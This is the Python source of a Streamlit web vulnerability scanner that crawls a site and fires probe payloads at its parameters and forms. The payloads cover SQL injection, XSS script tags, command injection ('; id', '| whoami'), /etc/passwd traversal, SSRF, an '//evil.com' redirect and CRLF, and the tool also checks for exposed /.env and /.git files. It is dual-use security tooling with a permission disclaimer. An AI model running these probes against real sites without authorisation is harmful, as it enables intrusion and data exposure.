import streamlit as st
import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse, parse_qs
import time, socket, json, random
from collections import deque
import datetime

# ---------------------------- PAGE CONFIG ----------------------------
st.set_page_config(page_title="CyberGuard | Web Vulnerability Analyser", page_icon="💀", layout="wide")

# ---------------------------- DARK THEME CSS ----------------------------
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&display=swap');
.stApp {
    background: #000;
    color: #00FF41;
    font-family: 'Share Tech Mono', monospace;
}
.stTextInput>div>div>input, .stTextArea>div>textarea, .stSelectbox>div>div {
    background: #0D0D0D; color: #00FF41; border: 1px solid #00FF41; caret-color: #FF003C;
}
.stButton>button {
    background: linear-gradient(45deg, #1A1A1A, #0D0D0D);
    color: #FF003C; font-weight: bold; border: 2px solid #FF003C;
    border-radius: 0; transition: 0.2s; text-transform: uppercase; letter-spacing: 2px;
    font-family: 'Orbitron', sans-serif;
}
.stButton>button:hover {
    background: #FF003C; color: #000; box-shadow: 0 0 30px #FF003C;
}
div[data-testid="stMetricValue"] {
    color: #00FF41; font-size: 2rem; text-shadow: 0 0 8px #00FF41;
    font-family: 'Orbitron', sans-serif;
}
.terminal {
    background: #0a0a0a; border: 1px solid #00FF41; padding: 10px;
    height: 400px; overflow-y: auto; font-family: 'Courier New', monospace;
    box-shadow: 0 0 10px #00FF41; margin-bottom: 20px;
}
.terminal .line { color: #00FF41; }
.terminal .warn { color: #FFAA00; }
.terminal .error { color: #FF003C; }
.terminal .info { color: #00AAFF; }
.target-card {
    background: #0D0D0D; border: 2px solid #FF003C; padding: 20px;
    margin-bottom: 20px; box-shadow: 0 0 15px #FF003C;
    text-align: center;
}
.target-card h2 { color: #FF003C; margin:0; }
.report-card {
    border: 1px solid #FF003C; background: #1A1A1A; padding: 15px; margin-bottom: 20px;
    border-radius: 5px;
}
.report-card h3 { color: #FF003C; }
.evidence-box {
    background: #0D0D0D; border-left: 4px solid #00FF41; padding: 10px;
    font-family: 'Courier New', monospace; color: #00FF41; white-space: pre-wrap;
    overflow-x: auto;
}
</style>
""", unsafe_allow_html=True)

# ---------------------------- GLOBAL SESSION ----------------------------
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
TIMEOUT = 8

# ---------------------------- PAYLOADS ----------------------------
PAYLOADS = {
    "sqli_error": ["'", '"', "1' OR '1'='1", "') OR ('1'='1"],
    "sqli_time": ["'; WAITFOR DELAY '00:00:05'--", "'; SELECT SLEEP(5)--"],
    "xss_reflected": [
        "<script>alert('XSS')</script>",
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>"
    ],
    "cmdi": ["; id", "| whoami", "$(sleep 5)"],
    "ssti": ["{{7*7}}", "${7*7}"],
    "lfi": ["../../../../etc/passwd"],
    "ssrf": ["http://127.0.0.1:80"],
    "open_redirect": ["//evil.com"],
    "crlf": ["%0d%0aSet-Cookie:crlf=injection"]
}

SENSITIVE_FILES = [
    "/.git/HEAD", "/.env", "/backup.zip", "/robots.txt"
]

# ---------------------------- VULNERABILITY CLASS ----------------------------
class Vulnerability:
    def __init__(self, name, severity, url, detail, evidence="", risk="", remediation=""):
        self.name = name
        self.severity = severity
        self.url = url
        self.detail = detail
        self.evidence = evidence
        self.risk = risk
        self.remediation = remediation

# ---------------------------- DETECTION HELPERS ----------------------------
def detect_sqli_error(text):
    errors = ["sql syntax", "mysql_fetch", "unclosed quotation", "you have an error in your sql",
              "pg_query", "ora-", "warning: mysql"]
    return any(e in text.lower() for e in errors)

def check_boolean_blind(url, param, val):
    pairs = [(" AND 1=1 -- ", " AND 1=2 -- "),
             ("' AND '1'='1", "' AND '1'='2")]
    for tp, fp in pairs:
        try:
            r1 = s.get(url.replace(f"{param}={val}", f"{param}={val}{tp}"), timeout=TIMEOUT)
            r2 = s.get(url.replace(f"{param}={val}", f"{param}={val}{fp}"), timeout=TIMEOUT)
            if abs(len(r1.content)-len(r2.content)) > 100:
                return True
        except:
            pass
    return False

def check_time_based(url, param, val, payload):
    try:
        start = time.time()
        s.get(url.replace(f"{param}={val}", f"{param}={val}{payload}"), timeout=TIMEOUT)
        if time.time() - start > 4.5:
            return True
    except:
        pass
    return False

def extract_snippet(html, payload):
    """Return surrounding text where payload appears."""
    idx = html.find(payload)
    if idx == -1:
        return html[:300]
    start = max(idx - 100, 0)
    end = min(idx + len(payload) + 100, len(html))
    return html[start:end]

# ---------------------------- ATTACK MODULES ----------------------------
def test_sqli(url, param, val, log_callback):
    for p in PAYLOADS["sqli_error"]:
        test_url = url.replace(f"{param}={val}", f"{param}={val}{p}")
        log_callback(f"Testing SQLi error on {param}: {p}")
        try:
            r = s.get(test_url, timeout=TIMEOUT)
            if detect_sqli_error(r.text):
                evidence = r.text[:500]
                return [Vulnerability(
                    "SQL Injection (Error‑based)", "critical", test_url,
                    f"Payload: {p}", evidence=evidence,
                    risk="Attacker can read, modify, or delete database content.",
                    remediation="Use parameterized queries. Never concatenate user input into SQL."
                )]
        except Exception as e:
            log_callback(f"Error: {e}")
    if check_boolean_blind(url, param, val):
        return [Vulnerability(
            "SQL Injection (Boolean blind)", "high", url,
            f"Parameter: {param}", evidence="Response length differs significantly.",
            risk="Slow but reliable extraction of database information.",
            remediation="Use parameterized queries."
        )]
    for p in PAYLOADS["sqli_time"]:
        if check_time_based(url, param, val, p):
            return [Vulnerability(
                "SQL Injection (Time‑based)", "high", url,
                f"Payload: {p}", evidence="Response delayed >5 seconds.",
                risk="Indicates blind SQL injection possible via time delays.",
                remediation="Use parameterized queries."
            )]
    return []

def test_xss(url, param, val, log_callback):
    for p in PAYLOADS["xss_reflected"]:
        test_url = url.replace(f"{param}={val}", f"{param}={val}{p}")
        log_callback(f"Testing XSS on {param}: {p[:30]}...")
        try:
            r = s.get(test_url, timeout=TIMEOUT)
            if p in r.text:
                evidence = extract_snippet(r.text, p)
                return [Vulnerability(
                    "Reflected XSS", "high", test_url,
                    f"Payload: {p}", evidence=evidence,
                    risk="Execute arbitrary JavaScript in victim's browser.",
                    remediation="Escape output. Implement CSP header."
                )]
        except Exception as e:
            log_callback(f"Error: {e}")
    return []

def test_cmdi(url, param, val, log_callback):
    for p in PAYLOADS["cmdi"]:
        test_url = url.replace(f"{param}={val}", f"{param}={val}{p}")
        log_callback(f"Testing CMDi on {param}: {p}")
        try:
            r = s.get(test_url, timeout=2 if "sleep" in p else TIMEOUT)
            if "uid=" in r.text or "root:" in r.text:
                evidence = extract_snippet(r.text, p)
                return [Vulnerability(
                    "Command Injection", "critical", test_url,
                    f"Payload: {p}", evidence=evidence,
                    risk="Execute arbitrary system commands.",
                    remediation="Avoid shell execution. Sanitize input."
                )]
        except requests.exceptions.Timeout:
            return [Vulnerability(
                "Command Injection (Time)", "high", test_url,
                f"Payload: {p}", evidence="Server delayed >5 seconds.",
                risk="Blind command injection via sleep.",
                remediation="Avoid shell execution."
            )]
        except Exception as e:
            log_callback(f"Error: {e}")
    return []

def test_ssti(url, param, val, log_callback):
    for p in PAYLOADS["ssti"]:
        test_url = url.replace(f"{param}={val}", f"{param}={val}{p}")
        log_callback(f"Testing SSTI on {param}: {p}")
        try:
            r = s.get(test_url, timeout=TIMEOUT)
            if "49" in r.text:
                evidence = extract_snippet(r.text, "49")
                return [Vulnerability(
                    "Server‑Side Template Injection", "critical", test_url,
                    f"Payload: {p}", evidence=evidence,
                    risk="Remote code execution via template engine.",
                    remediation="Never pass user input directly into templates."
                )]
        except Exception as e:
            log_callback(f"Error: {e}")
    return []

def test_lfi(url, param, val, log_callback):
    for p in PAYLOADS["lfi"]:
        test_url = url.replace(f"{param}={val}", f"{param}={p}")
        log_callback(f"Testing LFI on {param}: {p}")
        try:
            r = s.get(test_url, timeout=TIMEOUT)
            if "root:x:0:0" in r.text:
                evidence = extract_snippet(r.text, "root:x:")
                return [Vulnerability(
                    "Local File Inclusion", "critical", test_url,
                    f"Payload: {p}", evidence=evidence,
                    risk="Read sensitive files, possible RCE.",
                    remediation="Validate file paths. Use whitelists."
                )]
        except Exception as e:
            log_callback(f"Error: {e}")
    return []

def test_ssrf(url, param, val, log_callback):
    for p in PAYLOADS["ssrf"]:
        test_url = url.replace(f"{param}={val}", f"{param}={p}")
        log_callback(f"Testing SSRF on {param}: {p}")
        try:
            r = s.get(test_url, timeout=TIMEOUT)
            if "localhost" in r.text.lower():
                evidence = extract_snippet(r.text, "localhost")
                return [Vulnerability(
                    "Server‑Side Request Forgery", "high", test_url,
                    f"Payload: {p}", evidence=evidence,
                    risk="Access internal services or metadata.",
                    remediation="Validate and restrict URLs."
                )]
        except Exception as e:
            log_callback(f"Error: {e}")
    return []

def test_open_redirect(url, param, val, log_callback):
    for p in PAYLOADS["open_redirect"]:
        test_url = url.replace(f"{param}={val}", f"{param}={p}")
        log_callback(f"Testing Open Redirect on {param}: {p}")
        try:
            r = s.get(test_url, timeout=TIMEOUT, allow_redirects=False)
            if r.status_code in [301,302,303,307,308] and "evil.com" in r.headers.get("Location",""):
                return [Vulnerability(
                    "Open Redirect", "medium", test_url,
                    f"Redirects to {p}", evidence=f"Location: {r.headers.get('Location','')}",
                    risk="Phishing or bypass of URL filters.",
                    remediation="Use a whitelist for redirects."
                )]
        except Exception as e:
            log_callback(f"Error: {e}")
    return []

def test_crlf(url, param, val, log_callback):
    for p in PAYLOADS["crlf"]:
        test_url = url.replace(f"{param}={val}", f"{param}={p}")
        log_callback(f"Testing CRLF on {param}")
        try:
            r = s.get(test_url, timeout=TIMEOUT)
            if "crlf=injection" in r.headers.get("Set-Cookie",""):
                return [Vulnerability(
                    "CRLF Injection", "medium", test_url,
                    f"Payload: {p}", evidence=f"Set-Cookie: {r.headers.get('Set-Cookie','')}",
                    risk="HTTP response splitting, cookie poisoning.",
                    remediation="Encode CRLF characters."
                )]
        except Exception as e:
            log_callback(f"Error: {e}")
    return []

def check_security_headers(url, log_callback):
    vulns = []
    checks = {
        "Strict‑Transport‑Security": "max-age=31536000; includeSubDomains",
        "Content‑Security‑Policy": "default-src 'self'",
        "X‑Frame‑Options": "DENY or SAMEORIGIN",
        "X‑Content‑Type‑Options": "nosniff",
        "Referrer‑Policy": "no-referrer"
    }
    try:
        r = s.head(url, timeout=TIMEOUT, allow_redirects=True)
        for header, expected in checks.items():
            if header not in r.headers:
                vulns.append(Vulnerability(
                    f"Missing {header}", "low", url,
                    f"The server does not return a {header} header.",
                    evidence=f"Headers: {dict(r.headers)}",
                    risk="Increases attack surface (clickjacking, MIME sniffing, etc).",
                    remediation=f"Add `{header}: {expected}` to server configuration."
                ))
    except Exception as e:
        log_callback(f"Header check failed: {e}")
    return vulns

def check_sensitive_files(url, log_callback):
    vulns = []
    base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    for file_path in SENSITIVE_FILES:
        test_url = urljoin(base, file_path)
        log_callback(f"Checking {test_url}")
        try:
            r = s.head(test_url, timeout=TIMEOUT)
            if r.status_code == 200:
                vulns.append(Vulnerability(
                    "Sensitive File Exposed", "high", test_url,
                    f"File {file_path} is accessible.",
                    evidence=f"HTTP {r.status_code}",
                    risk="Exposes configuration or source code.",
                    remediation=f"Restrict access to {file_path}."
                ))
        except Exception as e:
            log_callback(f"Error: {e}")
    return vulns

# ---------------------------- CRAWLER ----------------------------
def crawl_links(base_url, max_depth, scope_domain=None, log_callback=None):
    visited = set()
    queue = deque([(base_url, 0)])
    all_links = []
    domain = urlparse(base_url).netloc
    if scope_domain is None:
        scope_domain = domain
    while queue:
        url, depth = queue.popleft()
        if url in visited or depth > max_depth:
            continue
        visited.add(url)
        if log_callback:
            log_callback(f"Crawling: {url}")
        try:
            resp = s.get(url, timeout=TIMEOUT)
        except Exception as e:
            if log_callback:
                log_callback(f"Failed to crawl {url}: {e}")
            continue
        soup = bs(resp.content, "html.parser")
        for a in soup.find_all("a", href=True):
            href = urljoin(url, a['href'])
            parsed = urlparse(href)
            if parsed.netloc == scope_domain and href not in visited:
                all_links.append(href)
                queue.append((href, depth+1))
        for form in soup.find_all("form"):
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            inputs = {}
            for inp in form.find_all(["input","textarea"]):
                name = inp.get("name")
                if name:
                    inputs[name] = ""
            # store HTML snippet for evidence
            form_snippet = str(form)[:500]
            all_links.append(("FORM", url, action, method, inputs, form_snippet))
    return all_links

# ---------------------------- TARGET INFO ----------------------------
def get_target_info(url):
    info = {"ip": "Unknown", "server": "Unknown", "status": "Offline", "time": "0s"}
    try:
        domain = urlparse(url).netloc.split(':')[0]
        info["ip"] = socket.gethostbyname(domain)
    except:
        pass
    try:
        start = time.time()
        r = s.get(url, timeout=TIMEOUT)
        info["time"] = f"{round(time.time() - start, 2)}s"
        info["status"] = f"HTTP {r.status_code}"
        info["server"] = r.headers.get("Server", "Hidden")
    except:
        info["status"] = "Connection Timeout"
    return info

# ---------------------------- MAIN SCANNER ----------------------------
def run_scan(target, config, log_callback, progress_callback):
    all_vulns = []
    log_callback("🔍 Starting crawl...")
    links = crawl_links(target, config["max_depth"], scope_domain=config.get("scope"), log_callback=log_callback)

    tasks = []
    for item in links:
        if isinstance(item, str):
            parsed = urlparse(item)
            if parsed.query:
                for param, values in parse_qs(parsed.query).items():
                    val = values[0]
                    if "sqli" in config["scan_modules"]:
                        tasks.append(("sqli", item, param, val))
                    if "xss" in config["scan_modules"]:
                        tasks.append(("xss", item, param, val))
                    if "cmdi" in config["scan_modules"]:
                        tasks.append(("cmdi", item, param, val))
                    if "ssti" in config["scan_modules"]:
                        tasks.append(("ssti", item, param, val))
                    if "lfi" in config["scan_modules"]:
                        tasks.append(("lfi", item, param, val))
                    if "ssrf" in config["scan_modules"]:
                        tasks.append(("ssrf", item, param, val))
                    if "open_redirect" in config["scan_modules"]:
                        tasks.append(("open_redirect", item, param, val))
                    if "crlf" in config["scan_modules"]:
                        tasks.append(("crlf", item, param, val))
        else:
            _, origin, action, method, inputs, form_html = item
            if "sqli" in config["scan_modules"] or "xss" in config["scan_modules"]:
                tasks.append(("form", action, method, inputs, form_html))

    if "headers" in config["scan_modules"]:
        tasks.append(("headers", target, None, None, None))
    if "sensitive_files" in config["scan_modules"]:
        tasks.append(("sensitive_files", target, None, None, None))

    total = len(tasks)
    log_callback(f"⚡ Total tests: {total}")
    completed = 0

    for task in tasks:
        ttype = task[0]
        if ttype == "sqli":
            _, url, param, val = task
            vulns = test_sqli(url, param, val, log_callback)
        elif ttype == "xss":
            _, url, param, val = task
            vulns = test_xss(url, param, val, log_callback)
        elif ttype == "cmdi":
            _, url, param, val = task
            vulns = test_cmdi(url, param, val, log_callback)
        elif ttype == "ssti":
            _, url, param, val = task
            vulns = test_ssti(url, param, val, log_callback)
        elif ttype == "lfi":
            _, url, param, val = task
            vulns = test_lfi(url, param, val, log_callback)
        elif ttype == "ssrf":
            _, url, param, val = task
            vulns = test_ssrf(url, param, val, log_callback)
        elif ttype == "open_redirect":
            _, url, param, val = task
            vulns = test_open_redirect(url, param, val, log_callback)
        elif ttype == "crlf":
            _, url, param, val = task
            vulns = test_crlf(url, param, val, log_callback)
        elif ttype == "form":
            _, action, method, inputs, form_html = task
            vulns = []
            for payload in ["'", "<script>alert(1)</script>"]:
                data = {k: payload for k in inputs}
                try:
                    r = s.post(action, data=data, timeout=TIMEOUT) if method=="post" else s.get(action, params=data, timeout=TIMEOUT)
                    if payload == "'" and detect_sqli_error(r.text):
                        vulns.append(Vulnerability(
                            "SQL Injection (Form)", "critical", action,
                            f"Form submission with payload: '",
                            evidence=form_html,  # use stored form HTML
                            risk="Database compromised via form.",
                            remediation="Use parameterized queries."
                        ))
                        log_callback("🔴 Form SQLi found")
                    elif payload != "'" and payload in r.text:
                        vulns.append(Vulnerability(
                            "XSS (Form)", "high", action,
                            f"Reflected payload in form.",
                            evidence=form_html,
                            risk="Cross‑site scripting via form input.",
                            remediation="Encode output."
                        ))
                        log_callback("🔴 Form XSS found")
                except Exception as e:
                    log_callback(f"Error testing form: {e}")
        elif ttype == "headers":
            vulns = check_security_headers(target, log_callback)
        elif ttype == "sensitive_files":
            vulns = check_sensitive_files(target, log_callback)
        else:
            vulns = []

        if vulns:
            all_vulns.extend(vulns)
            for v in vulns:
                log_callback(f"VULN|{v.severity}|{v.name}|{v.url}|{v.detail}")

        completed += 1
        progress_callback(completed / total)

        # Delay between requests (configurable)
        time.sleep(config.get("delay", 0.2))

    # Deduplicate
    unique = []
    seen = set()
    for v in all_vulns:
        key = (v.name, v.url)
        if key not in seen:
            seen.add(key)
            unique.append(v)
    return unique

# ---------------------------- STREAMLIT UI ----------------------------
st.markdown("""
<div style="text-align:center;">
    <h1 style="color:#FF003C; text-shadow:0 0 15px #FF003C;">💀 CYBERGUARD </h1>
    <p style="color:#00FF41;">Web Vulnerability Analyser ~ Developed by PPandey</p>
</div>
""", unsafe_allow_html=True)

st.warning("""
**⚖️ LEGAL DISCLAIMER** – For authorised security research, education, and bug bounty only.  
You must have explicit permission before scanning any target.
           **USE FOLLOWING TEST SITES** :–  
           1. https://pentest-ground.com:5013
           2. https://pentest-ground.com:9000
           3. https://pentest-ground.com:81
""")

with st.sidebar:
    st.markdown("### ⚙️ SCAN CONFIGURATION")
    target_url = st.text_input("🎯 Target URL", placeholder="https://example.com", key="target")
    modules = st.multiselect(
        "🧩 Attack Modules",
        ["sqli","xss","cmdi","ssti","lfi","ssrf","open_redirect","crlf","headers","sensitive_files"],
        default=["sqli","xss","cmdi","headers","sensitive_files"],
        help="Vulnerability checks to perform."
    )
    max_depth = st.slider("🔍 Crawl Depth", 1, 10, 3, help="How many link levels to crawl.")
    workers = st.slider("⚡ Concurrent Workers", 1, 10, 1, help="Number of simultaneous threads (concept only; Streamlit runs sequential).")
    delay = st.slider("⏱️ Request Delay (s)", 0.0, 2.0, 0.2, help="Pause between requests to avoid rate limits / WAF blocking.")
    launch_btn = st.button("🚀 LAUNCH ATTACK", use_container_width=True)

    st.markdown("---")
    st.markdown("### 📊 ATTACK PROGRESS")
    progress_bar = st.progress(0)
    progress_text = st.empty()
    timer_placeholder = st.empty()

# Main area
col_info, col_term = st.columns([1, 2], gap="medium")
with col_info:
    info_placeholder = st.empty()
with col_term:
    st.markdown("### 📡 TERMINAL")
    terminal_placeholder = st.empty()

report_placeholder = st.empty()

# ---------------------------- RUN LOGIC ----------------------------
if launch_btn and target_url:
    if not target_url.startswith("http"):
        st.error("URL must start with http:// or https://")
    else:
        terminal_lines = []
        start_time = time.time()

        def log(msg):
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            if msg.startswith("VULN|"):
                parts = msg.split("|", 4)
                sev, name, url, detail = parts[1], parts[2], parts[3], parts[4]
                severity_class = {"critical":"error","high":"error","medium":"warn","low":"info"}.get(sev, "line")
                card = f"<div class='{severity_class}'>[{sev.upper()}] {name}: {url}</div>"
                terminal_lines.append(card)
            else:
                terminal_lines.append(f"<div class='line'>[{ts}] {msg}</div>")
            terminal_html = "<div class='terminal'>" + "\n".join(terminal_lines[-200:]) + "</div>"
            terminal_placeholder.markdown(terminal_html, unsafe_allow_html=True)

        def update_progress(percent):
            progress_bar.progress(percent)
            progress_text.markdown(f"**{int(percent*100)}% completed**")
            elapsed = int(time.time() - start_time)
            timer_placeholder.markdown(f"⏱️ **{elapsed}s**")

        # Show target info prominently
        t_info = get_target_info(target_url)
        with info_placeholder.container():
            st.markdown("### 🕵️ Target Intelligence")
            st.markdown(f"""
            <div class="target-card">
                <h2>🌐 {target_url}</h2>
                <table style="width:100%; margin-top:15px; color:#00FF41;">
                <tr><td>📡 IP Address</td><td style="text-align:right;">{t_info['ip']}</td></tr>
                <tr><td>🖥️ Server</td><td style="text-align:right;">{t_info['server']}</td></tr>
                <tr><td>📶 Status</td><td style="text-align:right;">{t_info['status']}</td></tr>
                <tr><td>⏱️ Response Time</td><td style="text-align:right;">{t_info['time']}</td></tr>
                </table>
            </div>
            """, unsafe_allow_html=True)

        log("🚀 Attack launched")
        config = {
            "max_depth": max_depth,
            "scan_modules": modules,
            "workers": workers,
            "delay": delay,
            "scope": None
        }

        findings = run_scan(target_url, config, log, update_progress)
        progress_bar.progress(100)
        progress_text.markdown("**100% completed**")
        total_time = int(time.time() - start_time)
        timer_placeholder.markdown(f"⏱️ **Total time:** {total_time}s")

        # Detailed report
        with report_placeholder:
            st.markdown("## 📊 VULNERABILITY ASSESSMENT REPORT")
            if not findings:
                st.success("✅ No vulnerabilities found.")
            else:
                critical = [v for v in findings if v.severity=="critical"]
                high = [v for v in findings if v.severity=="high"]
                medium = [v for v in findings if v.severity=="medium"]
                low = [v for v in findings if v.severity=="low"]
                cols = st.columns(4)
                cols[0].metric("🔥 Critical", len(critical))
                cols[1].metric("⚠️ High", len(high))
                cols[2].metric("📌 Medium", len(medium))
                cols[3].metric("ℹ️ Low", len(low))
                st.markdown("---")
                for v in sorted(findings, key=lambda x: {"critical":0,"high":1,"medium":2,"low":3}[x.severity]):
                    emoji_sev = {"critical":"💀","high":"🔥","medium":"⚠️","low":"ℹ️"}[v.severity]
                    with st.expander(f"{emoji_sev} [{v.severity.upper()}] {v.name} – {v.url}"):
                        st.markdown(f"**📝 Detail:** {v.detail}")
                        if v.risk:
                            st.markdown(f"**⚠️ Risk:** {v.risk}")
                        if v.evidence:
                            st.markdown("**🔍 Evidence:**")
                            st.code(v.evidence, language="html" if "<" in v.evidence else "text")
                        if v.remediation:
                            st.markdown(f"**🛡️ Remediation:** {v.remediation}")
        st.success("✅ Scan complete.")